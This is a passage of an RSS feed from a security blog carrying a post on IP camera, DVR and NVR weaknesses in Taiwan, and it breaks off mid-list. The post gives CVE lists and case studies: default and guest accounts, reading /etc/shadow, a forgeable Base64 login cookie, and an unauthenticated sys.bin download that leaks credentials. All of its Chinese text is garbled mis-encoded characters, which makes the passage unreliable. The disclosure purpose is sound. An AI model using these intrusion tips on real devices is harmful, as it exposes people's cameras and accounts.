      &lt;p&gt;Á≥ªÁµ±Áí∞Â¢ÉËÆäÊï∏ÊúÉÂèóÂà∞ÂΩ±ÈüøÔºå‰ΩÜÁÑ°Ê≥ïË¢´ÊîªÊìäËÄÖÂà©Áî®„ÄÇ¬†&lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271/</link>
                <guid>https://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271</guid>
                <pubDate>Tue, 30 Sep 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Á∂≤Ë∑ØÊîùÂΩ±Ê©ü„ÄÅDVR„ÄÅNVR ÁöÑË≥áÂÆâË≠∞È°å - ‰Ω†Áü•ÈÅìÊàëÂú®Áúã‰Ω†ÂóéÔºü</title>
                <description>&lt;p&gt;Á∂≤Ë∑ØÊîùÂΩ±Ê©üÁöÑÊôÆÂèäÁéáÂú®ËøëÂπæÂπ¥‰æÜÊåÅÁ∫åÊîÄÂçáÔºåÈô§‰∫ÜËÄÅ‰∫∫ËàáÂπºÂÖíÂ±ÖÂÆ∂ÁÖßË≠∑„ÄÅ‰ºÅÊ•≠ÂÆ§ÂÖßÁõ£ÊéßÁ≠âÈúÄÊ±ÇËøÖÈÄüÂ¢ûÂä†‰πãÂ§ñÔºåÁµêÂêàÊâãÊ©üÊáâÁî®Á®ãÂºèËÆì‰∫∫ÂèØÈö®ÊôÇÈö®Âú∞ËßÄÁúãÂΩ±ÂÉèÁöÑÊñπ‰æøÊÄß‰πüÊàêÁÇ∫ÊôÆÂèäÁöÑÂéüÂõ†„ÄÇÁï∂Â§ßÂÆ∂ÈÇÑ‰ª•ÁÇ∫ÈªëÂ∏ΩÈß≠ÂÆ¢ÁöÑÁõÆÊ®ô‰ªçÁÑ∂ÊòØÁ∂≤Á´ô„ÄÅÂÄã‰∫∫ÈõªËÖ¶ÊôÇÔºåÂ∑≤Á∂ìÊúâË®±Â§öÊîªÊìäËÄÖÊÇÑÊÇÑÂú∞Â∞áÁõÆÊ®ôËΩâÂêë‰∫ÜÂêÑÁ®ÆÁâ©ÈÄ£Á∂≤Ë®≠ÂÇôÔºå‰æãÂ¶Ç NAS„ÄÅWireless AP„ÄÅPrinter Á≠âÁî¢ÂìÅÔºåËÄåÊìÅÊúâÁúæÂ§öÁî®Êà∂ÁöÑÁ∂≤Ë∑ØÊîùÂΩ±Ê©üÁêÜÊâÄÁï∂ÁÑ∂Âú∞‰πüÊòØÁõÆÊ®ô‰πã‰∏Ä„ÄÇË∫´ÁÇ∫ÂÆâÊéßÁî¢ÂìÅÔºåÂçªÈÄ†Êàê‰∏ÄÈ†ÖË≥áÂÆâÁöÑÈö±ÊÜÇÔºåÊòØ‰∏çÊòØÊúâÈªûË´∑Âà∫Âë¢Ôºü&lt;/p&gt;

&lt;p&gt;ÊÅ∞Â•ΩÊúÄËøëÂπæÂ§©ÂøΩÁÑ∂ÁúãÂà∞ÊúâÊñ∞ËÅûÂ†±Â∞é&lt;a href=&quot;http://news.ltn.com.tw/news/world/breakingnews/1112329&quot;&gt;„ÄåÂÆ∂Áî®Áõ£Ë¶ñÂô®ÈÅ≠Èß≠ÂÆ¢ÂÖ•‰æµ Èö±ÁßÅÂÖ®Ë¢´ÁúãÂÖâÂÖâ„Äç&lt;/a&gt;ÈÄôÊ®£Â≠êÁöÑÊ°à‰æãÔºåËÄåÂú®ÂéªÂπ¥‰πüÊúâÈ°û‰ººÁöÑÂ†±Â∞é&lt;a href=&quot;http://news.networkmagazine.com.tw/classification/security/2013/06/18/51531/&quot;&gt;„ÄåÊï∏ÂçÅËê¨ÊîØÁõ£ÊéßÊîùÂΩ±Ê©üÊΩõËóèË¢´Èß≠ÊºèÊ¥û ÈõªÂΩ±ÊÉÖÊôØÊÅêÁúüÂØ¶‰∏äÊºî„Äç&lt;/a&gt;ÔºåËÆìÊàëÂÄë‰∏çÁ¶ÅÊÉ≥Â∞çÈÄôÂÄã‰∫ã‰ª∂ÂÅöÂÄãÊ∑±ÂÖ•ÁöÑË™øÊü•„ÄÇÂ∞±ËÆìÊàëÂÄë‰æÜÁúãÁúãÁ∂≤Ë∑ØÊîùÂΩ±Ê©ü‰ª•ÂèäÁõ∏ÈóúÁî¢ÂìÅÁ©∂Á´üÊúâÂì™‰∫õÈ¢®Èö™ÂêßÔºÅ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;cve&quot;&gt;CVE&lt;/h3&gt;

&lt;p&gt;ÊàëÂÄëÂÖà‰æÜÁúãÁúãÂπæÂÄãÂ§ßÂª†Âú® 2013 Âπ¥Âà∞ 2014 Âπ¥‰πãÈñìÊúâÂì™‰∫õÂ∑≤Á∂ìË¢´ÂÖ¨ÈñãÊè≠Èú≤ÁöÑ CVE Âº±ÈªûÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;AVTECH: 3, CVE-2013-4980, CVE-2013-4981, CVE-2013-4982&lt;/li&gt;
  &lt;li&gt;AXIS: 2, CVE-2013-3543, CVE-2011-5261&lt;/li&gt;
  &lt;li&gt;Hikvision: 3, CVE-2013-4975, CVE-2013-4976, CVE-2013-4977&lt;/li&gt;
  &lt;li&gt;SONY: 1, CVE-2013-3539&lt;/li&gt;
  &lt;li&gt;Vivotek: 6, CVE-2013-1594, CVE-2013-1595, CVE-2013-1596, CVE-2013-1597, CVE-2013-1598, CVE-2013-4985&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ËÆÄËÄÖÂÄëËã•ÈÄ≤‰∏ÄÊ≠•ÂéªÁúãÂêÑÂÄã CVE ÁöÑË©≥Á¥∞Ë≥áÊñôÔºåÊúÉÁôºÁèæÊúâË®±Â§öÂº±ÈªûÈÉΩÊòØÂ±¨ÊñºÂèØÂü∑Ë°å‰ªªÊÑèÊåá‰ª§ÁöÑÂö¥ÈáçÊºèÊ¥ûÔºåÂÖ∂ÂΩ±ÈüøÁ®ãÂ∫¶ÈùûÂ∏∏È´òÔºåÂ∑≤‰∏çÂè™ÊòØÈóúÊñºÊîùÂΩ±ÂÖßÂÆπÊòØÂê¶Ë¢´Á´äÂèñÔºåÊõ¥ÊúâÂèØËÉΩË¢´Âà©Áî®Ê≠§È°ûË®≠ÂÇôÈÄ≤‰∏ÄÊ≠•ÊîªÊìäÂÖ∂‰ªñÂÖß„ÄÅÂ§ñÁ∂≤Ê©üÂô®„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Âè∞ÁÅ£ÁèæÊ≥Å&quot;&gt;Âè∞ÁÅ£ÁèæÊ≥Å&lt;/h3&gt;

&lt;p&gt;ÈõñÁÑ∂‰∏äÈù¢ÊèêÂà∞Ë®±Â§öÁü•ÂêçÂª†ÁâåÁöÑÂö¥ÈáçÊºèÊ¥ûÔºå‰ΩÜÊòØÊØèÂÄãÂúãÂÆ∂‰ΩøÁî®ÁöÑÂÆâÊéßË®≠ÂÇô‰∏çË¶ãÂæóÈÉΩÊòØ‰∏äËø∞ÂπæÂÄãÁâåÂ≠êÔºåËÄåË∫´ÁÇ∫Ë≥áÂÆâÊ•≠ËÄÖÔºåÈö®ÊôÇÈóúÊ≥®Ëá™Â∑±ÂúãÂÆ∂ÁöÑÁ∂≤Ë∑ØÁèæÊ≥Å‰πüÊòØÂæàÂêàÁêÜÁöÑ‰∫ãÊÉÖÔΩûÂú®ÊàëÂÄëÁöÑÂ§ßÈáèËßÄÊ∏¨‰∏ãÔºåÁôºÁèæÊúâË®±Â§ö IP Camera„ÄÅ&lt;a href=&quot;http://en.wikipedia.org/wiki/Digital_video_recorder&quot;&gt;DVR (Digital Video Recoder)&lt;/a&gt;„ÄÅ&lt;a href=&quot;http://en.wikipedia.org/wiki/Network_Video_Recorder&quot;&gt;NVR (Network Video Recoder)&lt;/a&gt; ÈÉΩÂ≠òÂú®Ë≥áÂÆâË≠∞È°åÔºåÊàëÂÄëÂæûÂÖ∂‰∏≠ÊèêÂá∫ÂπæÂÄãÊúâË∂£ÁöÑÊ°à‰æãË∑üÂêÑ‰ΩçÂàÜ‰∫´‰∏Ä‰∏ãÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;ÊüêÂúãÂ§ñ V ÁâåÂª†ÂïÜ ÔºàÊï∏ÈáèÔºö320+Ôºâ&lt;/p&gt;

    &lt;p&gt;‰∏ÄËà¨ÁöÑÁî¢ÂìÅÈÄöÂ∏∏ÈÉΩÊúÉÊúâÈ†êË®≠Â∏≥ËôüÂØÜÁ¢ºÔºå‰ΩÜÈÄôÈñìÂª†ÂïÜÁöÑÁî¢ÂìÅ‰ºº‰πéÊ≤íÊúâÈ†êË®≠Â∏≥ËôüÂØÜÁ¢ºÔºåËã•‰ΩøÁî®ËÄÖÊú™Ë®≠ÂÆöÂ∏≥ËôüÂØÜÁ¢ºÔºåÊîªÊìäËÄÖÂè™Ë¶ÅÁõ¥Êé•Èªû„ÄåOK„ÄçÊåâÈàïÂ∞±ÂèØ‰ª•ÁôªÂÖ•Á≥ªÁµ±ÔºåËÄåÈÄôÊ®£Â≠êÁöÑ DVR Âú®Âè∞ÁÅ£Êúâ‰∏âÁôæÂ§öÂè∞Ôºå‰πüÂ∞±ÊòØÊúâ‰∏âÁôæÂ§öÂè∞ DVR Âú®Á∂≤Ë∑Ø‰∏äË£∏Â•î‚Ä¶&lt;a href=&quot;/assets/img/blog/20140924/case_study_01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_01.png&quot; alt=&quot;Á∂≤Ë∑ØÊîùÂΩ±Ê©ü„ÄÅDVR„ÄÅNVR Ê°à‰æã 1&quot; title=&quot;Á∂≤Ë∑ØÊîùÂΩ±Ê©ü„ÄÅDVR„ÄÅNVR Ê°à‰æã 1&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ÊüêÂúãÂ§ñ H ÁâåÂª†ÂïÜ ÔºàÊï∏ÈáèÔºö1200+Ôºâ&lt;/p&gt;

    &lt;p&gt;Êúâ‰∫õÂª†ÂïÜÁÇ∫‰∫ÜÊñπ‰æøÁ∂≠‰øÆÊàñËÄÖÂÖ∂‰ªñÁêÜÁî±ÔºåÊúÉÂú® NVR ‰∏äÈñãÂïü‰∫Ü Telnet ÊúçÂãôÔºåÈõñÁÑ∂Â¢ûÂä†‰∫ÜË¢´ÊîªÊìäÁöÑÊ©üÁéáÔºå‰ΩÜÊòØËã•ÂØÜÁ¢ºÂº∑Â∫¶Ë∂≥Â§†‰∏îÊ≤íÊúâÂ§ñÊµÅÔºå‰πü‰∏çÊúÉÈö®‰æøË¢´ÊâìÈÄ≤Âéª„ÄÇËÄåÈÄôÈñìÂª†ÂïÜÈùûÂ∏∏ÊúâË∂£ÔºåÈô§‰∫Ü root Â∏≥Ëôü‰πãÂ§ñÈÇÑÊúâ‰∏ÄÁµÑ guest Â∏≥ËôüÔºå‰∏¶‰∏î guest ÁöÑÂØÜÁ¢ºÈùûÂ∏∏Á∞°ÂñÆÔºåÂä†‰∏äÁï∂ÂàùÂª∫ÁΩÆÁ≥ªÁµ±ÊôÇ‰∏¶Êú™Ê™¢Êü•Ê©üÊïèÊ™îÊ°àÁöÑÊ¨äÈôêÊòØÂê¶Ë®≠ÂÆöÈåØË™§ÔºåÂ∞éËá¥ÊîªÊìäËÄÖÂèØÂÖàÁî® guest Â∏≥ËôüÁôªÂÖ•ÔºåÂÜçÂéª /etc/shadow ËÆÄÂèñ root ÂØÜÁ¢ºÂä†‰ª•Á†¥Ëß£ÔºåÈÄ≤‰∏ÄÊ≠•ÂèñÂæóË®≠ÂÇôÊâÄÊúâÊ¨äÈôê„ÄÇ&lt;a href=&quot;/assets/img/blog/20140924/case_study_02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_02.png&quot; alt=&quot;Á∂≤Ë∑ØÊîùÂΩ±Ê©ü„ÄÅDVR„ÄÅNVR Ê°à‰æã 2&quot; title=&quot;Á∂≤Ë∑ØÊîùÂΩ±Ê©ü„ÄÅDVR„ÄÅNVR Ê°à‰æã 2&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ÊüêÂúãÂ§ñ D ÁâåÂª†ÂïÜ ÔºàÊï∏ÈáèÔºö700+Ôºâ&lt;/p&gt;

    &lt;p&gt;ÈÄôÂÄãÊ°à‰æãÂØ¶Âú®ÊòØ‰ª§‰∫∫Âì≠Á¨ë‰∏çÂæóÔºå‰∏çÁü•ÈÅìÊòØÂéüÂª†ÈÇÑÊòØÂè∞ÁÅ£‰ª£ÁêÜÂïÜÈùûÂ∏∏Â•ΩÂøÉÂú∞Âπ´‰ΩøÁî®ËÄÖÂª∫Á´ã‰∫ÜÂ§öÁµÑÈ†êË®≠Â∏≥ËôüÔºåÂåÖÂê´ admin„ÄÅ666666„ÄÅ888888 Á≠âÁ≠âÔºåËÄå‰∏îÂØÜÁ¢º‰πüË®≠ÂÆöÂæóÂæàÁ∞°ÂñÆ„ÄÇ‰ΩÜÊòØÈÄöÂ∏∏Ë¶Å‰ΩøÁî®ËÄÖË®òÂæóÊîπ‰∏ÄÁµÑÈ†êË®≠ÂØÜÁ¢ºÂ∑≤Á∂ìÈùûÂ∏∏Âõ∞Èõ£ÔºåÊõ¥‰ΩïÊ≥ÅÊòØË¶Å‰ΩøÁî®ËÄÖÊîπ‰∏âÁµÑÂØÜÁ¢ºÂë¢ÔºüÈÄôÁ®ÆÊÉÖÂΩ¢Â∞éËá¥ÊîªÊìäËÄÖÂèØ‰ª•ËºïËÄåÊòìËàâÂú∞ÊãøËëóÂº±ÂØÜÁ¢ºÂà∞ËôïÁåúÔºåÂ§ßÂ§ßÊèêÈ´ò‰∫ÜÁî®Êà∂ÁöÑÂèóÂÆ≥Ê©üÁéá„ÄÇËÄåÊõ¥ÊúâË∂£ÁöÑÊòØÔºå‰∏çÁü•ÈÅìÊòØÂü∫ÊñºÊ≠∑Âè≤ÂåÖË¢±ÊàñËÄÖÂÖ∂‰ªñÂéüÂõ†ÔºåÊ≠§Ë®≠ÂÇôÈñã‰∫ÜÁâπÊÆäÁöÑ portÔºåÁõ¥Êé•ÈÄÅÂá∫Âê´ÊúâÁâπÂÆöÂÖßÂÆπÁöÑÂ∞ÅÂåÖÂà∞ÈÄôÂÄã port Â∞±ÂèØ‰ª•Âü∑Ë°åÁõ∏Â∞çÊáâÁöÑÊåá‰ª§Ôºå‰æãÂ¶ÇÂèØ‰ª•ÂèñÂæóÂ∏≥ËôüÂØÜÁ¢º„ÄÅ‰ΩøÁî®ËÄÖ email Á≠âÁ≠âÔºåËÄåÂú®ÈÄôÂÄãÈÅéÁ®ã‰∏≠ÂÆåÂÖ®Ê≤íÊúâ‰ªª‰ΩïË™çË≠âÊ©üÂà∂ÔºÅÁ≠âÊñºÂèàÊúâ‰∏ÉÁôæÂ§öÂè∞ NVR Âú®Á∂≤Ë∑Ø‰∏äË£∏Â•î‚Ä¶&lt;a href=&quot;/assets/img/blog/20140924/case_study_03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_03.png&quot; alt=&quot;Á∂≤Ë∑ØÊîùÂΩ±Ê©ü„ÄÅDVR„ÄÅNVR Ê°à‰æã 3&quot; title=&quot;Á∂≤Ë∑ØÊîùÂΩ±Ê©ü„ÄÅDVR„ÄÅNVR Ê°à‰æã 3&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ÊüêÂúãÂÖß A ÁâåÂª†ÂïÜ ÔºàÊï∏ÈáèÔºö1000+Ôºâ&lt;/p&gt;

    &lt;p&gt;ÈÄôÈñìÂª†ÂïÜ‰πüÊòØ‰ΩøÁî®Â∏∏Ë¶ãÁöÑÈ†êË®≠Â∏≥ËôüÂØÜÁ¢ºÔºå‰ΩÜÂÆÉÂèØÊÄïÁöÑÂú∞ÊñπÈÇÑ‰∏çÊ≠¢ÊñºÊ≠§„ÄÇË©≤Á≥ªÁµ±Â∞áÂ∏≥ËôüÂØÜÁ¢ºËΩâÁÇ∫ Base64 Á∑®Á¢ºÂæåÁõ¥Êé•Áï∂‰Ωú cookie ÂÖßÂÆπÔºåÂõ†Ê≠§Ëã•È†êË®≠Â∏≥ËôüÂØÜÁ¢ºÂàÜÂà•ÊòØ abc Ëàá 123ÔºåÂ∞á abc:123 Áî® Base64 Á∑®Á¢ºÈÅéÂæåÂèØÂæóÂà∞ YWJjOjEyMw==ÔºåÊé•ËëóÂ∞á Cookie: SSID=YWJjOjEyMw== ÈÄô‰∏≤ÂÖßÂÆπÂä†Âà∞ request ÁöÑ HTTP header ‰∏≠ÔºåÂ∞±ÂèØ‰ª•Âà∞ËôïÊ∏¨Ë©¶Ë©≤Ë®≠ÂÇôÊòØÂê¶‰ΩøÁî®È†êË®≠Â∏≥ËôüÂØÜÁ¢ºÔºåÁîöËá≥ÈÇÑÂèØ‰ª•ÈÄ≤‰∏ÄÊ≠•‰∏ãËºâÂÇô‰ªΩÊ™îÔºåÂØüÁúã‰ΩøÁî®ËÄÖÊúâÁÑ°Â°´ÂØ´ email„ÄÅÁ∂≤Ë∑ØÂ∏≥ËôüÂØÜÁ¢ºÁ≠âË≥áÊñô„ÄÇ&lt;a href=&quot;/assets/img/blog/20140924/case_study_04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_04.png&quot; alt=&quot;Á∂≤Ë∑ØÊîùÂΩ±Ê©ü„ÄÅDVR„ÄÅNVR Ê°à‰æã 4&quot; title=&quot;Á∂≤Ë∑ØÊîùÂΩ±Ê©ü„ÄÅDVR„ÄÅNVR Ê°à‰æã 4&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ÊüêÂúãÂÖß A ÁâåÂª†ÂïÜÔºàÊï∏ÈáèÔºö10+Ôºâ&lt;/p&gt;

    &lt;p&gt;ÈÄôÂÄãÊ°à‰æãÈõñÁÑ∂Êï∏ÈáèÈùûÂ∏∏Â∞ëÔºå‰ΩÜÊòØÂçªÈùûÂ∏∏Âö¥Èáç„ÄÇÁÇ∫‰ªÄÈ∫ºÂë¢ÔºüÂõ†ÁÇ∫Âª†ÂïÜÊ≤íÊúâÂ∞çÊ©üÊïèË≥áÊñôÂÅöÂö¥Ê†ºÁöÑÊ¨äÈôêÊéßÁÆ°ÔºåÂè™Ë¶ÅÊîªÊìäËÄÖÁõ¥Êé•Âú®Á∂≤ÂùÄÂàóËº∏ÂÖ• http://IP/sys.binÔºåÂ∞±ÂèØ‰ª•Áõ¥Êé•‰∏ãËºâ‰∏ÄÂÄãÂêçÁÇ∫ sys.bin ÁöÑÊ™îÊ°àÔºåËÄåÊ≠§Ê™îÊ°àÊòØ tgz Ê†ºÂºèÔºåËß£Â£ìÁ∏ÆÂæåÂèØ‰ª•ÂæóÂà∞ system_server.confÔºåË©≤Ê™îÊ°à‰∏≠Âê´ÊúâÂ∏≥Ëôü„ÄÅÂØÜÁ¢ºÔºåÂõ†Ê≠§Âç≥‰æø‰ΩøÁî®ËÄÖ‰øÆÊîπ‰∫ÜÈ†êË®≠Â∏≥ËôüÂØÜÁ¢ºÔºå‰πüÊúÉÂõ†ÁÇ∫ÈÄôÂÄãÂö¥ÈáçÊºèÊ¥ûËÄåËºïÊòìÂú∞Ë¢´ÂÖ•‰æµ„ÄÇ&lt;a href=&quot;/assets/img/blog/20140924/case_study_05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_05.png&quot; alt=&quot;Á∂≤Ë∑ØÊîùÂΩ±Ê©ü„ÄÅDVR„ÄÅNVR Ê°à‰æã 5&quot; title=&quot;Á∂≤Ë∑ØÊîùÂΩ±Ê©ü„ÄÅDVR„ÄÅNVR Ê°à‰æã 5&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;XXXXÁßëÊäÄ ÔºàÊï∏ÈáèÔºö230+Ôºâ&lt;/p&gt;

    &lt;p&gt;ÈÄôÊòØ‰∏ÄÂÄãÈùûÂ∏∏Á∂ìÂÖ∏ÁöÑÊ°à‰æãÔºÅ‰∏ÄËà¨ÊîªÊìäËÄÖÂÖ•‰æµÊîùÂΩ±Ê©üÊúÄÂ∏∏Ë¶ãÁöÑÂ∞±ÊòØÁÇ∫‰∫ÜÂÅ∑ÁúãÊîùÂΩ±Ê©üÁï´Èù¢ÔºåÂÜçÈÄ≤Èöé‰∏ÄÈªûÁöÑÂèØËÉΩÊúÉÊéßÂà∂Ë©≤ÊîùÂΩ±Ê©üÈÄ≤‰∏ÄÊ≠•ÊîªÊìäÂÖßÁ∂≤„ÄÇËÄåÈÄôÂÆ∂Âª†ÂïÜË∫´ÁÇ∫Áü•Âêç‰øùÂÖ®ÂÖ¨Âè∏ÊäïË≥áÊàêÁ´ãÁöÑÂÆâÊéßÂÖ¨Âè∏ÔºåÁêÜÁï∂ÁÇ∫ÂÆ¢Êà∂ÁöÑÁõ£ÊéßÁï´Èù¢ÂÅöÊúÄÂë®ÂÖ®ÁöÑË¶èÂäÉ„ÄÅÊúÄË¨πÊÖéÁöÑÈò≤Ë≠∑Ôºå‰ΩÜÊòØÁµêÊûúÂë¢ÔºüÂ†±ÂëäÂêÑ‰ΩçÔºåÂÆåÂÖ®Ê≤íÊúâ‰ªª‰ΩïÈò≤Ë≠∑ÔºÅÂè™Ë¶ÅÈÄ£Âà∞ IP ‰ΩçÂùÄÂ∞±ÂèØ‰ª•Áõ¥Êé•ÁúãÂà∞ÊîùÂΩ±Ê©üÁï´Èù¢Ôºå‰πüÊòØÂ±¨ÊñºË£∏Â•î‰∏ÄÊóè‚Ä¶&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÂæûÈÄôÂπæÂÄãÊ°à‰æãÊàëÂÄëÂèØ‰ª•ÁôºÁèæÂè∞ÁÅ£ÁõÆÂâçËá≥Â∞ëÊúâ 3500 Âè∞Â∑¶Âè≥ÁöÑÂÆâÊéßË®≠ÂÇôËôïÊñºÈ´òÈ¢®Èö™ÁãÄÊÖã‰∏≠ÔºåËÄåÁî±ÊñºÊàëÂÄëÁÑ°ÊöáÂ∞çÊØè‰∏ÄÊ¨æË®≠ÂÇôÈÄ≤Ë°åË™øÊü•ÔºåÂõ†Ê≠§ÈÄôÂÉÖÂÉÖÊòØ‰∏ÄÂÄãÊ¶ÇÁï•ÁöÑË™øÊü•ÁµêÊûú„ÄÇÂêåÊôÇÈÄô‰∫õË®≠ÂÇôÈÉΩÊòØÂú®Á∂≤Ë∑Ø‰∏äÂèØÁõ¥Êé•ÈÄ£Á∑öÁöÑÔºåËã•ÂÜçÂä†‰∏äÂêÑÂÄãÂÖ¨ÂÆ∂Ê©üÈóú„ÄÅËæ¶ÂÖ¨Â§ßÊ®ì„ÄÅÁ§æÂçÄÁöÑÂÖßÁ∂≤ÂÆâÊéßË®≠ÂÇôÔºåÊÅêÊÄïÊúÉÊúâÊõ¥È©ö‰∫∫ÁöÑÁôºÁèæ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÂïèÈ°åËµ∑Ê∫ê&quot;&gt;ÂïèÈ°åËµ∑Ê∫ê&lt;/h3&gt;

&lt;p&gt;Á©∂Á´üÁÇ∫‰ªÄÈ∫ºÊúÉÊúâÈÄôÈ∫ºÂ§öÂÆâÊéßË®≠ÂÇôË¢´ÂÖ•‰æµÂë¢ÔºüÂÖ∂ÂØ¶‰∏ªË¶ÅÊúâÂÖ©ÂÄãÈù¢Âêë„ÄÇÁ¨¨‰∏ÄÂÄãÊòØÁî±ÊñºË®±Â§öÂª†ÂïÜÁöÑÈò≤ÁØÑËßÄÂøµ‰ªçÂÅúÁïôÂú®ËàäÊôÇ‰ª£Ôºå‰∏ç‰∫ÜËß£Èß≠ÂÆ¢Âà∞Â∫ïÈÉΩÊÄéÈ∫ºÊîªÊìäÔºåÂõ†Ê≠§‰πü‰∏ç‰∫ÜËß£Á¢∫ÂàáÁöÑÈò≤Ê≤ªÊñπÊ≥ï„ÄÇËàâ‰æã‰æÜË™™ÔºåÂª†ÂïÜÂú®Á∂≤Ë∑ØÂÆâÊéßÁ≥ªÁµ±ÁöÑ Web Ëº∏ÂÖ•‰ªãÈù¢ÈÉΩÊúÉË®≠ÂÆöË®±Â§öÈòªÊìãË¶èÂâáÔºå‰ª•Èò≤ÁØÑÂÖ•‰æµËÄÖËº∏ÂÖ•ÊÉ°ÊÑèÊîªÊìäÊåá‰ª§Ôºå‰ΩÜÊòØÈÄô‰∫õÈò≤Ê≤ªÊâãÊÆµÈÉΩÂÉÖÂÉÖÂÅöÂú® client Á´ØÔºàÁî® JavaScript ‰æÜÈò≤Ë≠∑ÔºâÔºåÂÖ•‰æµËÄÖÂè™Ë¶ÅÂà©Áî® proxy Â∑•ÂÖ∑ÊàñËá™Ë°åÂØ´Á®ãÂºèÁôºÈÄÅÂÆ¢Ë£ΩÂåñ request Â∞±ÂèØ‰ª•ÁπûÈÅéÈÇ£‰∫õÈ©óË≠âÔºåËã•Âª†ÂïÜÊ≤íÊúâÂú® server Á´ØÂÜçÊ¨°ÈÄ≤Ë°åÈ©óË≠âËº∏ÂÖ•Ë≥áÊñôÊòØÂê¶Áï∞Â∏∏ÔºåÂ∞±ÊúâÂæàÈ´òÁöÑÊ©üÊúÉË¢´ÂÖ•‰æµÊàêÂäü„ÄÇ&lt;/p&gt;

&lt;p&gt;Âè¶‰∏ÄÊñπÈù¢ÂâáÊòØÂÖ•‰æµËÄÖÁöÑÊîªÊìäÊâãÊ≥ïÂçÉËÆäËê¨ÂåñÔºåÈõ£‰ª•‰øùË≠â‰∏çÊúÉÊúâÊñ∞ÁöÑ 0-Day Âº±ÈªûÂá∫Áèæ„ÄÇ‰æãÂ¶Ç‰ªäÂπ¥‰∏ÄÊúà‰ªΩÂ§ßÈáèÁàÜÁôºÁöÑ NTP Âº±Èªû CVE-2013-5211 Â∞±Â≠òÂú®Êñº‰∏äËø∞ÂÖ≠ÂÄãÊ°à‰æãÂÖ∂‰∏≠‰πã‰∏ÄÔºåÊàëÊÉ≥Âª†ÂïÜÊáâË©≤‰∏çÊúÉÊúâÊÑèÈ°òÈáùÂ∞çËàäÁî¢ÂìÅ‰øÆÂæ©Ê≠§È°ûÊºèÊ¥ûÔºå‰πüÂ∞±ÊòØÊú™‰æÜÈö®ÊôÇÊúâÂπæÁôæÂè∞ÁöÑÊîùÂΩ±Ê©üÂèØË¢´ÊÉ°ÊÑè‰∫∫Â£´Áî®‰æÜÂü∑Ë°å DDoS ÊîªÊìä„ÄÇÂè¶Â§ñ‰ªäÂπ¥ÂõõÊúà‰ªΩÁöÑ OpenSSL Heartbleed Âº±ÈªûÊõ¥ÊòØ‰∏ÄÂÄãÂÖ∑Êúâ‰ª£Ë°®ÊÄßÁöÑÈáçË¶ÅÊ°à‰æãÔºåÊàëÊÉ≥ÈÄôÊáâË©≤ÊòØË®±Â§öÂÆâÊéßË®≠ÂÇôÂª†ÂïÜÈÉΩÊúÉ‰ΩøÁî®ÁöÑÁ®ãÂºè„ÄÇÁï∂Âª†ÂïÜÂ∞áÊ≠§È°ûÁ®ãÂºèÁ¥çÂÖ•Á∂≤Ë∑ØÂÆâÊéßË®≠ÂÇô‰∏≠ÔºåÊñºÂº±ÈªûË¢´Êè≠Èú≤ÊôÇËã•ÁÑ°Ê≥ïÂèäÊôÇÊúâÊïà‰øÆË£úÔºåÊàñÊòØ‰øÆË£úÁöÑÊàêÊú¨Â§™È´òÂ∞éËá¥Áî®Êà∂‰∏çÈ°òÊÑè‰øÆË£ú„ÄÅÊ≤íÊúâËÉΩÂäõ‰øÆË£úÔºåÂ∞±ÊúâÂèØËÉΩÈáÄÊàêÈáçÂ§ßÁÅΩÊÉÖÔºå‰∏ç‰ΩÜÈÄ†ÊàêÁî®Êà∂ÊêçÂ§±Ôºå‰πüÂö¥ÈáçÂΩ±ÈüøÂïÜË≠Ω„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Âª†ÂïÜË©≤Â¶Ç‰ΩïÂõ†Êáâ&quot;&gt;Âª†ÂïÜË©≤Â¶Ç‰ΩïÂõ†ÊáâÔºü&lt;/h3&gt;

&lt;p&gt;ÈáùÂ∞çÊ≠§È°ûË≥áÂÆâÂïèÈ°åÔºåÂ§ßÂûãÁ°¨È´îÂª†ÂïÜÊáâË©≤ËêΩÂØ¶‰ª•‰∏ãÂπæÂÄãÂãï‰ΩúÔºö&lt;/p&gt;

&lt;ul&gt;
